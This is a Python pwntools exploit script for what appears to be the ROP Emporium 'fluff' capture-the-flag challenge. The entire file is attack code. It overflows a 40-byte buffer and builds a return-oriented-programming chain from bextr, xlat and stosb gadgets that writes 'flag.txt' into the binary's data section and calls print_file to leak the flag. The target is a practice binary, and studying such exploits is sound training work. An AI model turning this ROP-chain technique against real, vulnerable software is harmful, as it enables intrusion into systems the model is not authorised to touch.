#!/usr/bin/env python3

from pwn import *

exe = ELF("fluff_patched")
libc = ELF("libfluff.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 40
    printfile = 0x400510
    datasec = 0x601028
    poprdi = 0x4006a3
    xlat = 0x400628
    bextr = 0x40062a
    stos = 0x400639

    stringtowrite = b"flag.txt"
    charlocs = []

    for char in stringtowrite:
        char_addr = hex(read('fluff_patched').find(char) + exe.address)
        charlocs.append(char_addr)

    currentrax = 0xb
    fluffexp = b''

    for i, charloc in enumerate(charlocs):
        if(i != 0):
            currentrax = stringtowrite[i-1]
        fluffexp += pack(bextr)
        fluffexp += pack(0x4000)
        fluffexp += pack(int(charloc, 16) - currentrax - 0x3ef2)
        fluffexp += pack(xlat)
        fluffexp += pack(poprdi)
        fluffexp += pack(datasec + i)
        fluffexp += pack(stos)

    payload = flat(b'A'*offset, fluffexp, poprdi, datasec, printfile)

    r.sendlineafter(b">", payload)

    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
